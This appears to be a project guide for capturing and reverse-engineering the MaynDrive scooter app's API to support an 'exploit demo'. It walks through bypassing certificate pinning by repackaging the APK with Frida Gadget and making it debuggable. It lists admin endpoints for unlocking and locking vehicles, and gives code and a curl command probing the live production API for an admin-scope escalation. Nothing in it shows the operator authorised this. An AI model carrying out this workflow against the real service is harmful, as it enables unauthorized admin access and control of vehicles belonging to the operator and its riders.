# Phone Traffic Analysis Guide

## Why You Need This

The exploit demo is getting "Bad Gateway" errors because it's calling `https://api.knotcity.io` which appears to be:
- Down or temporarily offline
- Blocking automated requests
- Requiring additional headers/parameters we don't know about

**Solution:** Capture real traffic from the MaynDrive app on your phone to see the ACTUAL endpoints and parameters.

---

## Quick Setup (Recommended Method)

### Option 1: HTTP Toolkit (Easiest)

1. **Download HTTP Toolkit**
   - Visit: https://httptoolkit.tech/
   - Install on your computer

2. **Connect Your Android Phone**
   - Open HTTP Toolkit
   - Click "Android Device via ADB"
   - Connect phone via USB
   - Enable USB Debugging on phone:
     - Settings → About Phone → Tap "Build Number" 7 times
     - Settings → Developer Options → Enable "USB Debugging"

3. **Capture Traffic**
   - HTTP Toolkit will auto-configure your phone
   - Open MaynDrive app
   - Login and perform actions:
     - ✓ Login
     - ✓ View nearby scooters
     - ✓ Unlock a scooter (if possible)
     - ✓ View vehicle details
     - ✓ Lock scooter
   - All API calls will appear in HTTP Toolkit!

4. **Export Captured Traffic**
   - In HTTP Toolkit, click "Export"
   - Save as HAR file: `mayndrive_traffic.har`

---

### Option 2: mitmproxy (Advanced)

If you're comfortable with command line:

```bash
# 1. Install mitmproxy
pip install mitmproxy

# 2. Start mitmweb (web interface)
mitmweb -p 8080

# 3. Configure your phone's WiFi proxy
# - Connect phone to same WiFi as computer
# - Find your computer's IP: ipconfig (Windows) or ifconfig (Linux/Mac)
# - On phone: Settings → WiFi → Long press network → Modify → Proxy Manual
# - Hostname: <your-computer-ip>
# - Port: 8080

# 4. Install mitmproxy certificate
# - On phone, open browser and go to: http://mitm.it
# - Download and install Android certificate

# 5. Open mitmweb in browser: http://localhost:8081
# - Open MaynDrive app on phone
# - All traffic appears in mitmweb!

# 6. Save traffic
mitmdump -r ~/.mitmproxy/flows -w mayndrive_traffic.flow
```

---

## If You Get Certificate Pinning Errors

The MaynDrive app likely uses certificate pinning. Here are **NON-ROOT methods** for your Redmi 13C 4G:

### Method 1: Non-Root Frida Gadget Injection ⭐ RECOMMENDED (80-90% Success Rate)

**No root required!** This embeds Frida into the APK itself by repackaging.

#### Prerequisites

```bash
# Install required tools
pip install frida-tools

# Download Apktool from https://apktool.org (or via pip)
# Download Frida Gadget for ARM64 (Redmi 13C uses Helio G85 = arm64)
# Visit: https://github.com/frida/frida/releases
# Download: frida-gadget-*-android-arm64.so
```

#### Step-by-Step Process

**1. Extract the MaynDrive APK**
```bash
# From your phone via ADB
adb shell pm path city.knot.mayndrive
# Output: package:/data/app/city.knot.mayndrive-xxx/base.apk

adb pull /data/app/city.knot.mayndrive-xxx/base.apk mayndrive_original.apk

# IMPORTANT: Backup the original!
cp mayndrive_original.apk mayndrive_backup.apk
```

**2. Decompile the APK**
```bash
apktool d mayndrive_original.apk -o mayndrive_decompiled
```

**3. Add Frida Gadget Library**
```bash
# Create library directory for ARM64
mkdir -p mayndrive_decompiled/lib/arm64-v8a/

# Copy Frida Gadget (rename to standard library name)
cp frida-gadget-16.5.9-android-arm64.so mayndrive_decompiled/lib/arm64-v8a/libfrida-gadget.so
```

**4. Inject Gadget Load Call in Smali Code**

```bash
# Find main activity from AndroidManifest.xml
grep "android.intent.action.MAIN" -B 10 mayndrive_decompiled/AndroidManifest.xml

# Look for the activity name, typically: city.knot.mayndrive.MainActivity
# Open the corresponding .smali file:
# mayndrive_decompiled/smali/city/knot/mayndrive/MainActivity.smali
```

Edit the MainActivity.smali file and find the `<init>` method (constructor):

```smali
.method public constructor <init>()V
    .locals 1                     # Increment this if needed (0 -> 1, 1 -> 2)
    
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V
    
    # ADD THESE TWO LINES HERE (after invoke-direct, before any other code):
    const-string v0, "frida-gadget"
    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    
    # ... rest of constructor
    return-void
.end method
```

**Important:** Increment `.locals` count by 1 if you're using a new register (e.g., `.locals 0` → `.locals 1`)

**5. Optional: Auto-load SSL Unpinning Script**

Create config file `mayndrive_decompiled/lib/arm64-v8a/libfrida-gadget.config.so`:

```json
{
  "interaction": {
    "type": "script",
    "path": "/data/local/tmp/ssl-unpinning.js"
  }
}
```

Then push your script to device:
```bash
adb push ssl-unpinning.js /data/local/tmp/
adb shell chmod 644 /data/local/tmp/ssl-unpinning.js
```

**6. Rebuild the APK**
```bash
apktool b mayndrive_decompiled -o mayndrive_modified.apk
```

**7. Align and Sign the APK**

```bash
# Create signing key (first time only)
keytool -genkey -v -keystore my-release-key.keystore \
  -keyalg RSA -keysize 2048 -validity 10000 -alias my-key-alias

# Align APK (optimizes for Android)
zipalign -v -p 4 mayndrive_modified.apk mayndrive_aligned.apk

# Sign APK
apksigner sign --ks my-release-key.keystore \
  --out mayndrive_signed.apk mayndrive_aligned.apk

# Verify signature
apksigner verify mayndrive_signed.apk
```

**8. Install Modified APK**

```bash
# BACKUP YOUR LOGIN CREDENTIALS FIRST!
# Uninstall original app
adb uninstall city.knot.mayndrive

# Install modified version
adb install mayndrive_signed.apk
```

**9. Launch and Test**

```bash
# Launch the app on your phone
# If using auto-load config, script runs automatically
# Otherwise, inject manually:
frida -U Gadget -l ssl-unpinning.js

# Or if app is already running:
frida -U -f city.knot.mayndrive -l ssl-unpinning.js --no-pause
```

**Troubleshooting:**
- ❌ **App crashes on launch:** Anti-tampering detected. Try making app debuggable:
  ```xml
  <!-- In AndroidManifest.xml, add to <application> tag -->
  android:debuggable="true"
  ```
- ❌ **Gadget not loading:** Verify architecture matches (use `adb shell getprop ro.product.cpu.abi`)
- ❌ **Script not running:** Check Frida console for errors; test with simple script first

---

### Method 2: Automated with android-unpinner (Easiest!)

Automates the entire process:

```bash
# Install (includes all dependencies)
pip install android-unpinner

# Automatic unpinning and repackaging
android-unpinner all mayndrive_original.apk

# This automatically:
# 1. Decompiles APK
# 2. Injects Frida Gadget  
# 3. Adds SSL unpinning scripts
# 4. Makes app debuggable
# 5. Rebuilds, aligns, and signs
# 6. Installs on device

# Output: mayndrive_original.unpinned.apk
adb install mayndrive_original.unpinned.apk
```

**Advantages:** One command, no manual edits  
**Limitations:** Less control over customization

---

### Method 3: Using LIEF for Native Library Apps

If MaynDrive uses native libraries (check for `.so` files in `lib/arm64-v8a/`):

```python
# inject_gadget_native.py
import lief

# Parse the main native library
lib_path = "mayndrive_decompiled/lib/arm64-v8a/libnative.so"
lib = lief.parse(lib_path)

# Add Frida Gadget as a dependency
lib.add_library("libfrida-gadget.so")

# Write modified library back
lib.write(lib_path)

print(f"✓ Gadget dependency added to {lib_path}")

# Verify
import subprocess
result = subprocess.run(['readelf', '-d', lib_path], capture_output=True, text=True)
print(result.stdout)
```

```bash
pip install lief
python inject_gadget_native.py

# Then proceed with rebuild/sign steps from Method 1
# No smali edits needed!
```

---

### Method 4: Root Required (Traditional Frida - Only if rooted)

```bash
# 1. Install Frida tools
pip install frida-tools

# 2. Download frida-server for Android
# Visit: https://github.com/frida/frida/releases
# Download the version matching your Android architecture (arm64 usually)

# 3. Push to phone
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "su -c /data/local/tmp/frida-server &"

# 4. Run SSL unpinning script (already in your project!)
frida -U -f city.knot.mayndrive -l ssl-unpinning.js --no-pause

# 5. Now use mitmproxy/HTTP Toolkit as normal
```

---

### Comparison of Methods

| Method | Root? | Difficulty | Success Rate | Best For |
|--------|-------|------------|--------------|----------|
| Frida Gadget Injection | No | Medium | 80-90% | Custom scripts, full control |
| android-unpinner | No | Easy | 70-80% | Quick testing |
| LIEF Native Injection | No | Advanced | 85-90% | Apps with native libs |
| Root + frida-server | Yes | Easy | 95%+ | If you have root access |

**Recommendation:** Start with Method 2 (android-unpinner) for quick testing. If it fails, use Method 1 (manual Gadget injection) for more control.

---

## Analyzing Captured Traffic

Once you have captured traffic, use the analyzer script:

```bash
# Convert HAR to JSON (if needed)
python traffic_analyzer.py mayndrive_traffic.har

# Or analyze mitmproxy flows
mitmdump -r mayndrive_traffic.flow -w mayndrive_traffic.json
python traffic_analyzer.py mayndrive_traffic.json
```

### What to Look For:

1. **Actual API Base URL**
   ```
   Is it really: https://api.knotcity.io ?
   Or could it be: https://api.knotcity.io/v1/ ?
   Or: https://mayndrive-api.knotcity.io ?
   ```

2. **Required Headers**
   ```
   User-Agent: Knot-mayndrive v1.1.34 (android)
   X-API-Key: ??? (might be required)
   X-Device-ID: ??? (might be required)
   X-Platform: android
   Authorization: Bearer <token>
   ```

3. **Login Endpoint**
   ```json
   POST /api/application/login
   {
     "email": "...",
     "password": "...",
     "device": {
       "uuid": "...",
       "platform": "android",
       ...
     },
     "scope": "user"  // Can we change this to "admin"?
   }
   ```

4. **Admin Endpoints**
   ```
   POST /api/application/vehicles/unlock/admin
   POST /api/application/vehicles/freefloat/lock/admin
   POST /api/application/vehicles/freefloat/identify/admin
   GET  /api/application/vehicles/sn/{serial}/admin
   GET  /api/application/vehicles/sn/{serial}/admin-refresh
   ```

5. **Response Format**
   ```json
   {
     "access_token": "...",
     "refresh_token": "...",
     "expires_in": 3600,
     "scope": "user"  // Does this come back as "admin" if we request it?
   }
   ```

---

## Update the API Client

After capturing real traffic, update `mayn_drive_api.py`:

### 1. Fix Base URL (if different)
```python
ENVIRONMENTS = {
    'production': 'https://api.knotcity.io',  # Update if wrong
    'production_v2': 'https://api.knotcity.io/v2',  # Add if needed
    ...
}
```

### 2. Add Missing Headers (if found)
```python
self.session.headers.update({
    'User-Agent': 'Knot-mayndrive v1.1.34 (android)',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-API-Key': 'YOUR_API_KEY_IF_NEEDED',  # Add if required
    'X-Platform': 'android'  # Add if required
})
```

### 3. Fix Endpoint Paths (if different)
```python
# If the real endpoint is different:
# OLD: '/api/application/vehicles/unlock/admin'
# NEW: '/api/v2/application/vehicles/unlock/admin'

def unlock_vehicle_admin(self, ...):
    success, data = self._make_request(
        'POST', 
        '/api/v2/application/vehicles/unlock/admin',  # Updated
        json_data=payload
    )
```

---

## Testing the Updated API

After making changes based on captured traffic:

```python
# Test with your own credentials
from mayn_drive_api import MaynDriveAPI

api = MaynDriveAPI()
success, data = api.login("your.email@example.com", "your_password")

if success:
    print("✅ Login successful!")
    print(f"Token: {api.access_token}")
    
    # Try admin scope
    api2 = MaynDriveAPI()
    success, data = api2.login("your.email@example.com", "your_password", scope="admin")
    
    if success:
        print("🚨 VULNERABLE! Admin scope accepted!")
    else:
        print("✅ Admin scope rejected")
else:
    print(f"❌ Login failed: {data}")
```

---

## What You'll Discover

By analyzing phone traffic, you'll learn:

1. ✅ **Exact API endpoints** - No more guessing
2. ✅ **Required headers** - Know what's mandatory
3. ✅ **Authentication flow** - How tokens really work
4. ✅ **Request/response formats** - Exact JSON schemas
5. ✅ **Admin endpoints availability** - Do they exist? Are they protected?
6. ✅ **Vulnerability confirmation** - Can you really request admin scope?

---

## Quick Test Right Now

You can test if the API is even reachable:

```bash
# Test from command line
curl -v https://api.knotcity.io/api/application/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Knot-mayndrive v1.1.34 (android)" \
  -d '{"email":"test@test.com","password":"test"}'

# If you get 502 Bad Gateway → API is down
# If you get 401 Unauthorized → API is up but credentials wrong (GOOD!)
# If you get 404 Not Found → Endpoint path is wrong
```

---

## Summary

**Current Problem:** Production API at `https://api.knotcity.io` is unreachable

**Solution:** 
1. Capture real traffic from MaynDrive app on your phone
2. Verify actual endpoints and parameters
3. Update `mayn_drive_api.py` with correct details
4. Re-run exploit demo with real data

**Tools You Already Have:**
- ✅ `MITM_PROXY_SETUP.md` - Full proxy setup guide
- ✅ `ssl-unpinning.js` - Bypass certificate pinning
- ✅ `traffic_analyzer.py` - Analyze captured traffic
- ✅ All exploit scripts ready to test

**Next Step:** Choose HTTP Toolkit (easiest) or mitmproxy (advanced) and capture that traffic! 📱🔍

